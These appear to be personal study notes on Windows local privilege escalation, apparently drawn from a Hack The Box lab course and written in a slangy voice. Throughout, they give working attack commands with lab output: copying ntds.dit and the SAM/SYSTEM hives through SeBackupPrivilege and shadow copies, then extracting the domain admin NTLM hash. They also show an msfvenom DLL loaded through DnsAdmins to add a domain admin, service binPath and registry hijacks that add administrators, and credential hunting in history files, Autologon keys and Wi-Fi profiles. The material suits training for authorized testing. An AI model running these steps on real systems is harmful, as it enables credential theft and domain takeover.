## 🔧 Tools for Windows Privilege Escalation

|Tool|Description|
|---|---|
|[Seatbelt](https://github.com/GhostPack/Seatbelt)|C# tool that checks tons of LPE stuff — creds, services, env vars, etc. Good all-in-one recon.|
|[winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)|Auto PE checker. Flags everything: weak perms, registry issues, stored creds... full scan. More info [here](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation).|
|[PowerUp](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1)|OG PowerShell script that finds LPE paths like weak services, DLL hijacks, etc. Can also exploit some stuff.|
|[SharpUp](https://github.com/GhostPack/SharpUp)|C# clone of PowerUp. Use it if PowerShell is locked down.|
|[JAWS](https://github.com/411Hall/JAWS)|Basic PowerShell 2.0 script that lists juicy LPE info. Lightweight and simple.|
|[SessionGopher](https://github.com/Arvanaghi/SessionGopher)|Finds + decrypts saved RDP/SSH/FTP sessions. Grabs creds from PuTTY, WinSCP, FileZilla, etc.|
|[Watson](https://github.com/rasta-mouse/Watson)|Checks missing patches and shows you known LPE exploits for your Windows version.|
|[LaZagne](https://github.com/AlessandroZ/LaZagne)|Dumps saved passwords from apps like browsers, mail clients, WiFi configs, etc.|
|[WES-NG](https://github.com/bitsadmin/wesng)|Parses `systeminfo` to list missing Windows patches + known exploits. Covers XP → Win10 + Servers.|
|[Sysinternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)|Bunch of powerful tools. Focus on:• [AccessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk): check permissions• [PipeList](https://docs.microsoft.com/en-us/sysinternals/downloads/pipelist): list named pipes• [PsService](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice): manage services|

---

## 📜 Enumeration Commands + What They Do

### 🔒 List AppLocker Rules

```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

> 🔍 See if AppLocker is active and what scripts are blocked/allowed (good for bypass ideas)

---

### 🛡️ Check Windows Defender Status

```powershell
Get-MpComputerStatus
```

> 🧪 Tells you if AV is active, real-time scan on, etc. Useful to avoid getting clapped

---

### 🛰️ Show Routing Table

```cmd
route print
```

> 🌐 Shows network routes — might reveal other subnets or gateways

---

### 📡 Show ARP Cache

```cmd
arp -a
```

> 🔎 List IP ↔ MAC mappings. Can help ID live hosts or sniffable targets.

---

### 🌐 Get All Network Interface Info (IP, DNS, etc.)

```cmd
ipconfig /all
```

> 📍 Shows adapter configs, DNS suffixes, DHCP status — useful for pivoting or spoofing

---

### 🧠 List All Running Tasks + Services

```cmd
tasklist /svc
```

> 🧩 See what’s running and which service runs under which process. Great for finding privilege stuff or custom apps

---

### 📂 Dump All Env Vars

```cmd
set
```

> 🧬 Can contain user paths, temp dirs, usernames, passwords, and other juicy info

---

### 🏷️ View System Info

```cmd
systeminfo
```

> 📋 Dump OS info: hostname, version, domain, arch, install date. Needed for some LPE tools (like WES-NG)

---

### 🩹 List Installed Updates + Patches (WMIC)

```cmd
wmic qfe
```

> 📆 Good for finding missing patches and CVE exploitation (esp. with Watson or WES-NG)

---

### 🩹 List Installed Updates (PowerShell way)

```powershell
Get-HotFix | ft -AutoSize
```

> 🛠️ Alternative to `wmic qfe` — easier to parse and nicer output

---

![Diagram showing access control process. Subject (user) with access token including User SID, Group SIDs, Privileges, and Extra Access Information. Object (folder) with security descriptor including Object Owner SID, Group SID, SACL, and DACL with ACEs. System performs access check, examines ACEs until a match is found, and makes access decision.](https://academy.hackthebox.com/storage/modules/67/auth_process.png)
## Rights and Privileges in Windows

Windows contains many groups that grant their members powerful rights and privileges. Many of these can be abused to escalate privileges on both a standalone Windows host and within an Active Directory domain environment. Ultimately, these may be used to gain Domain Admin, local administrator, or SYSTEM privileges on a Windows workstation, server, or Domain Controller (DC). Some of these groups are listed below.

|**Group**|**Description**|
|---|---|
|Default Administrators|Domain Admins and Enterprise Admins are "super" groups.|
|Server Operators|Members can modify services, access SMB shares, and backup files.|
|Backup Operators|Members are allowed to log onto DCs locally and should be considered Domain Admins. They can make shadow copies of the SAM/NTDS database, read the registry remotely, and access the file system on the DC via SMB. This group is sometimes added to the local Backup Operators group on non-DCs.|
|Print Operators|Members can log on to DCs locally and "trick" Windows into loading a malicious driver.|
|Hyper-V Administrators|If there are virtual DCs, any virtualization admins, such as members of Hyper-V Administrators, should be considered Domain Admins.|
|Account Operators|Members can modify non-protected accounts and groups in the domain.|
|Remote Desktop Users|Members are not given any useful permissions by default but are often granted additional rights such as `Allow Login Through Remote Desktop Services` and can move laterally using the RDP protocol.|
|Remote Management Users|Members can log on to DCs with PSRemoting (This group is sometimes added to the local remote management group on non-DCs).|
|Group Policy Creator Owners|Members can create new GPOs but would need to be delegated additional permissions to link GPOs to a container such as a domain or OU.|
|Schema Admins|Members can modify the Active Directory schema structure and backdoor any to-be-created Group/GPO by adding a compromised account to the default object ACL.|
|DNS Admins|Members can load a DLL on a DC, but do not have the necessary permissions to restart the DNS server. They can load a malicious DLL and wait for a reboot as a persistence mechanism. Loading a DLL will often result in the service crashing. A more reliable way to exploit this group is to [create a WPAD record](https://web.archive.org/web/20231115070425/https://cube0x0.github.io/Pocing-Beyond-DA/).|
## User Rights Assignment

Depending on group membership, and other factors such as privileges assigned via domain and local Group Policy, users can have various rights assigned to their account. This Microsoft article on [User Rights Assignment](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/user-rights-assignment) provides a detailed explanation of each of the user rights that can be set in Windows as well as security considerations applicable to each right. Below are some of the key user rights assignments, which are settings applied to the localhost. These rights allow users to perform tasks on the system such as logon locally or remotely, access the host from the network, shut down the server, etc.

|Setting [Constant](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)|Setting Name|Standard Assignment|Description|
|---|---|---|---|
|SeNetworkLogonRight|[Access this computer from the network](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/access-this-computer-from-the-network)|Administrators, Authenticated Users|Determines which users can connect to the device from the network. This is required by network protocols such as SMB, NetBIOS, CIFS, and COM+.|
|SeRemoteInteractiveLogonRight|[Allow log on through Remote Desktop Services](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/allow-log-on-through-remote-desktop-services)|Administrators, Remote Desktop Users|This policy setting determines which users or groups can access the login screen of a remote device through a Remote Desktop Services connection. A user can establish a Remote Desktop Services connection to a particular server but not be able to log on to the console of that same server.|
|SeBackupPrivilege|[Back up files and directories](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/back-up-files-and-directories)|Administrators|This user right determines which users can bypass file and directory, registry, and other persistent object permissions for the purposes of backing up the system.|
|SeSecurityPrivilege|[Manage auditing and security log](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/manage-auditing-and-security-log)|Administrators|This policy setting determines which users can specify object access audit options for individual resources such as files, Active Directory objects, and registry keys. These objects specify their system access control lists (SACL). A user assigned this user right can also view and clear the Security log in Event Viewer.|
|SeTakeOwnershipPrivilege|[Take ownership of files or other objects](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects)|Administrators|This policy setting determines which users can take ownership of any securable object in the device, including Active Directory objects, NTFS files and folders, printers, registry keys, services, processes, and threads.|
|SeDebugPrivilege|[Debug programs](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/debug-programs)|Administrators|This policy setting determines which users can attach to or open any process, even a process they do not own. Developers who are debugging their applications do not need this user right. Developers who are debugging new system components need this user right. This user right provides access to sensitive and critical operating system components.|
|SeImpersonatePrivilege|[Impersonate a client after authentication](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/impersonate-a-client-after-authentication)|Administrators, Local Service, Network Service, Service|This policy setting determines which programs are allowed to impersonate a user or another specified account and act on behalf of the user.|
|SeLoadDriverPrivilege|[Load and unload device drivers](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/load-and-unload-device-drivers)|Administrators|This policy setting determines which users can dynamically load and unload device drivers. This user right is not required if a signed driver for the new hardware already exists in the driver.cab file on the device. Device drivers run as highly privileged code.|
|SeRestorePrivilege|[Restore files and directories](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/restore-files-and-directories)|Administrators|This security setting determines which users can bypass file, directory, registry, and other persistent object permissions when they restore backed up files and directories. It determines which users can set valid security principals as the owner of an object.|

Further information can be found [here](https://4sysops.com/archives/user-rights-assignment-in-windows-server-2016/).

#### Local Admin User Rights - Elevated

If we run an elevated command window, we can see the complete listing of rights available to us:

Windows Privileges Overview

```powershell
PS C:\htb> whoami 

winlpe-srv01\administrator


PS C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects  
```

#### Standard User Rights

```powershell
PS C:\htb> whoami 

winlpe-srv01\htb-student


PS C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

#### Backup Operators Rights

```powershell
PS C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```


| [Backup Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-backupoperators)            | [Event Log Readers](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-eventlogreaders) | [DnsAdmins](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-dnsadmins)              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| [Hyper-V Administrators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-hypervadministrators) | [Print Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-printoperators)    | [Server Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators) |
## Backup Operators

After landing on a machine, we can use the command `whoami /groups` to show our current group memberships. Let's examine the case where we are a member of the `Backup Operators` group. Membership of this group grants its members the `SeBackup` and `SeRestore` privileges. The [SeBackupPrivilege](https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/privileges) allows us to traverse any folder and list the folder contents. This will let us copy a file from a folder, even if there is no access control entry (ACE) for us in the folder's access control list (ACL). However, we can't do this using the standard copy command. Instead, we need to programmatically copy the data, making sure to specify the [FILE_FLAG_BACKUP_SEMANTICS](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea) flag.

We can use this [PoC](https://github.com/giuliano108/SeBackupPrivilege) to exploit the `SeBackupPrivilege`, and copy this file. First, let's import the libraries in a PowerShell session.

#### Importing Libraries

Windows Built-in Groups

```powershell
PS C:\htb> Import-Module .\SeBackupPrivilegeUtils.dll
PS C:\htb> Import-Module .\SeBackupPrivilegeCmdLets.dll
```

#### Verifying SeBackupPrivilege is Enabled

Let's check if `SeBackupPrivilege` is enabled by invoking `whoami /priv` or `Get-SeBackupPrivilege` cmdlet. If the privilege is disabled, we can enable it with `Set-SeBackupPrivilege`.

Note: Based on the server's settings, it might be required to spawn an elevated CMD prompt to bypass UAC and have this privilege.

Windows Built-in Groups

```powershell
PS C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

Windows Built-in Groups

```powershell
PS C:\htb> Get-SeBackupPrivilege

SeBackupPrivilege is disabled
```

#### Enabling SeBackupPrivilege

If the privilege is disabled, we can enable it with `Set-SeBackupPrivilege`.

Windows Built-in Groups

```powershell
PS C:\htb> Set-SeBackupPrivilege
PS C:\htb> Get-SeBackupPrivilege

SeBackupPrivilege is enabled
```

Windows Built-in Groups

```powershell
PS C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

#### Copying a Protected File

As we can see above, the privilege was enabled successfully. This privilege can now be leveraged to copy any protected file.

Windows Built-in Groups

```powershell
PS C:\htb> dir C:\Confidential\

    Directory: C:\Confidential

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         5/6/2021   1:01 PM             88 2021 Contract.txt


PS C:\htb> cat 'C:\Confidential\2021 Contract.txt'

cat : Access to the path 'C:\Confidential\2021 Contract.txt' is denied.

```

Windows Built-in Groups

```powershell
PS C:\htb> Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt

Copied 88 bytes


PS C:\htb>  cat .\Contract.txt

Inlanefreight 2021 Contract

==============================

Board of Directors:

<...SNIP...>
```

The commands above demonstrate how sensitive information was accessed without possessing the required permissions.

Alright, here’s the no-fluff breakdown of what’s going on here: you're basically yanking the **NTDS.dit** file (the crown jewel of Active Directory) without tripping system alarms, and then cracking it open to pull hashes. Here's the whole flow in Gen Z terms with tips:

🔧 **Tools Used**

- `diskshadow` (to make shadow copies)
- `Copy-FileSeBackupPrivilege` (to copy locked files)
- `reg save` (to grab SYSTEM & SAM)
- `DSInternals` PowerShell module (to extract the creds)
- `secretsdump.py` (optional alternative)

---

**Step-by-Step Breakdown**


**Get Local Logon to the DC**

You need local access or RDP—this ain’t something you can do remotely unless you're already deep in the box.

 📸 2. **Create a Shadow Copy (Mirror of C:)**

```ps1
diskshadow.exe

set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
exit
```

✅ This creates a virtual E: drive that’s a snapshot of C:, **without locks** on files like `ntds.dit`.

 📦 3. **Copy NTDS.dit File with Special Privileges**

```ps1
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

📌 This uses **SeBackupPrivilege** to bypass ACLs. Basically says “I’m admin, trust me bro.”

 🧩 4. **Also Backup the SYSTEM and SAM Hive**

You’ll need these to decrypt hashes (esp. for local users).

```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```

 🧠 5. **Extract NTLM Hashes (e.g., with DSInternals)**

```ps1
Import-Module .\DSInternals.psd1
$key = Get-BootKey -SystemHivePath .\SYSTEM
Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
```

🔑 Boom, you've got the NTLM hash for the domain admin. Pass-the-hash time, baby.

---

 🚨 Real-World Pro Tips

- 💀 If `SeBackupPrivilege` isn’t enabled or you're not SYSTEM/Administrator, this won't fly.
- 🚷 Explicit deny entries = full stop. Even backup semantics can’t save you.
- 🧪 You can automate this whole process with a script if you're post-exploitation.
- 🪪 Use Impacket's `secretsdump.py` if you're more comfy in Python:  
    ```bash
    secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL
    ```

Goal  
Gain access to and analyze Windows security event logs for process creation and command-line usage to detect suspicious behavior.

Purpose  
Help defenders or attackers (during red teaming) understand how command-line auditing works, what can be logged, and how to access or evade detection via these logs. Also shows how low-budget setups can still catch attackers.

Command

1. **Check group membership (Event Log Readers)**

```
net localgroup "Event Log Readers"
```
    
2. **Search Security log with `wevtutil`**  
    Basic search for command-line entries with `/user`:
    
```
wevtutil qe Security /rd:true /f:text | findstr "/user"
```

1. **Use alternate credentials with `wevtutil`**  
    Useful for remote log access with another user's credentials:
    
```
wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
```
    
4. **Search process creation logs (Event ID 4688) with PowerShell**  
    Admin rights required unless registry permissions are changed:
    
```
Get-WinEvent -LogName Security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*' } | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```
    

Notes
- Auditing process command-line logging must be enabled.
- Logs can leak passwords passed as arguments (e.g., `net use ... /user:... password`).
- Adding users to the Event Log Readers group lets them read logs without full admin access.
- Tight AppLocker rules can block dangerous commands even if logging is bypassed.
- Common commands attackers use include: `tasklist`, `systeminfo`, `ipconfig`, `dir`, `net view`, `ping`, `net use`, `wmic`, etc.



## DNS Admins
Generating Malicious DLL
We can generate a malicious DLL to add a user to the `domain admins` group using `msfvenom`.

```shell
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```


Loading DLL as Non-Privileged User

```cmd
C:\htb> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

DNS Server failed to reset registry property.
    Status = 5 (0x00000005)
Command failed: ERROR_ACCESS_DENIED
```

Loading DLL as Member of DnsAdmins

```powershell
C:\htb> Get-ADGroupMember -Identity DnsAdmins

distinguishedName : CN=netadm,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
name              : netadm
objectClass       : user
objectGUID        : 1a1ac159-f364-4805-a4bb-7153051a8c14
SamAccountName    : netadm
SID               : S-1-5-21-669053619-2741956077-1013132368-1109           
```

#### Loading Custom DLL

After confirming group membership in the `DnsAdmins` group, we can re-run the command to load a custom DLL.


```cmd
C:\htb> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.
```

Note: We must specify the full path to our custom DLL or the attack will not work properly.

#### Finding User's SID

First, we need our user's SID.

```cmd
C:\htb> wmic useraccount where name="netadm" get sid

SID
S-1-5-21-669053619-2741956077-1013132368-1109
```

#### Checking Permissions on DNS Service

Once we have the user's SID, we can use the `sc` command to check permissions on the service. Per this [article](https://www.winhelponline.com/blog/view-edit-service-permissions-windows/), we can see that our user has `RPWP` permissions which translate to `SERVICE_START` and `SERVICE_STOP`, respectively.

```cmd
C:\htb> sc.exe sdshow DNS

D:(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SO)(A;;RPWP;;;S-1-5-21-669053619-2741956077-1013132368-1109)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)
```

Check out the `Windows Fundamentals` module for an explanation of SDDL syntax in Windows.

#### Stopping the DNS Service

After confirming these permissions, we can issue the following commands to stop and start the service.

```cmd
C:\htb> sc stop dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x1
        WAIT_HINT          : 0x7530
```

The DNS service will attempt to start and run our custom DLL, but if we check the status, it will show that it failed to start correctly (more on this later).


### Server Operators
```cmd
C:\htb> sc qc AppReadiness
```

```cmd
C:\htb> sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
```

```cmd
C:\htb> sc start AppReadiness

[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
```
> Here, failing is expected

|Group Policy Setting|Registry Key|Default Setting|
|---|---|---|
|[User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)|FilterAdministratorToken|Disabled|
|[User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)|EnableUIADesktopToggle|Disabled|
|[User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)|ConsentPromptBehaviorAdmin|Prompt for consent for non-Windows binaries|
|[User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)|ConsentPromptBehaviorUser|Prompt for credentials on the secure desktop|
|[User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)|EnableInstallerDetection|Enabled (default for home) Disabled (default for enterprise)|
|[User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)|ValidateAdminCodeSignatures|Disabled|
|[User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)|EnableSecureUIAPaths|Enabled|
|[User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)|EnableLUA|Enabled|
|[User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)|PromptOnSecureDesktop|Enabled|
|[User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)|EnableVirtualization|Enabled|

### 🧠 Core Idea

Windows is bad at locking down permissions. If you can write where you shouldn’t, you can hijack services and escalate to SYSTEM. Most of this abuse hits **services** with bad file/registry permissions.

---

### 🔓 **Modifiable Service Binaries (File ACLs)**

- Use `SharpUp.exe audit` to find services with binaries you can overwrite.

- Confirm with:

```bash
icacls "C:\Program Files\Path\Binary.exe"
```

- If `Everyone` or `Users` has `(F)` (full control) = it’s game over.


**Attack:**

1. Overwrite binary with a malicious payload (`msfvenom`, etc.).

2. Start the service:

```cmd
sc start <ServiceName>
```


---

### 🛠️ **Weak Service Permissions (Service Control ACLs)**

- Check with:

```cmd
accesschk.exe -quvcw <ServiceName>
```

- If `Authenticated Users` has `SERVICE_ALL_ACCESS`, you can **reconfigure** the service.


**Attack:**

1. Change `binpath` to your command:

```cmd
sc config <ServiceName> binpath= "cmd /c net localgroup administrators htb-student /add"
```

1. Restart the service:

```cmd
sc stop <ServiceName>  
sc start <ServiceName>
```


---

### 🪓 **Unquoted Service Paths**

- If the path has spaces and **no quotes**, Windows tries to run parts of the path as programs (yep, dumb AF).


**Attack vector example:**  
If service runs:

```
C:\Program Files\My App\service.exe
```

Windows may check:

- `C:\Program.exe`

- `C:\Program Files\My.exe`


**Find them with:**

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /v /i "c:\windows\\" | findstr /v /i '"'
```

**Problem:** You’d need to drop a file like `C:\Program.exe`, which usually requires admin anyway.

---

### 🧬 **Weak Registry Permissions**

- Check registry keys for write access:

```cmd
accesschk.exe -kvuqsw hklm\System\CurrentControlSet\Services
```

- If you can modify `ImagePath`, you win.


**Exploit:**

```powershell
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\<ServiceName> -Name "ImagePath" -Value "C:\Path\To\Payload.exe"
```

---

### 🔁 **Registry Autoruns (Persistence / Escalation)**

- Use:

```cmd
wmic startup get caption,command
```

- If you can overwrite a binary listed there or edit its registry entry, you can escalate when someone logs in.


---

### 🧼 Cleanup (Always Be Professional)

- Reset the binpath after abuse:

```cmd
sc config <ServiceName> binpath= "C:\Original\Path\to\binary.exe"
sc start <ServiceName>
```

## PowerShell History File

#### Command to

Starting with Powershell 5.0 in Windows 10, PowerShell stores command history to the file:

- `C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`.
```powershell
(Get-PSReadLineOption).HistorySavePath
```


```powershell
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```

#### Decrypting PowerShell Credentials

If we have gained command execution in the context of this user or can abuse DPAPI, then we can recover the cleartext credentials from `encrypted.xml`. The example below assumes the former.

  Credential Hunting

```powershell
PS C:\htb> $credential = Import-Clixml -Path 'C:\scripts\pass.xml'
PS C:\htb> $credential.GetNetworkCredential().username

bob


PS C:\htb> $credential.GetNetworkCredential().password

Str0ng3ncryptedP@ss!
```

#### Search File Contents for String - Example 3


```cmd
C:\htb> findstr /spin "password" *.*

stuff.txt:1:password: l#-x9r11_2_GL!
```

```powershell 
dir -Path C:\ -Recurse -Filter *.config
```

#### View sticky notes 

```powershell
$db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'

./strings.exe $db 
```

#### Miscellaneous credential theft techniques


##### AutoLogon.exe 

The registry keys associated with Autologon can be found under `HKEY_LOCAL_MACHINE` in the following hive, and can be accessed by standard users:

Code: cmd

```cmd
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
```

The typical configuration of an Autologon account involves the manual setting of the following registry keys:

- `AdminAutoLogon` - Determines whether Autologon is enabled or disabled. A value of "1" means it is enabled.
- `DefaultUserName` - Holds the value of the username of the account that will automatically log on.
- `DefaultPassword` - Holds the value of the password for the user account specified previously.


```cmd-session
C:\htb>reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    
    <SNIP>
    
    AutoAdminLogon    REG_SZ    1
    DefaultUserName    REG_SZ    htb-student
    DefaultPassword    REG_SZ    HTB_@cademy_stdnt!
```

##### Wifi passwords
Retrieving Saved Wireless Passwords
Depending on the network configuration, we can retrieve the pre-shared key (`Key Content` below) and potentially access the target network. While rare, we may encounter this during an engagement and use this access to jump onto a separate wireless network and gain access to additional resources.

  Further Credential Theft

```cmd-session
C:\htb> netsh wlan show profile ilfreight_corp key=clear
```

##### 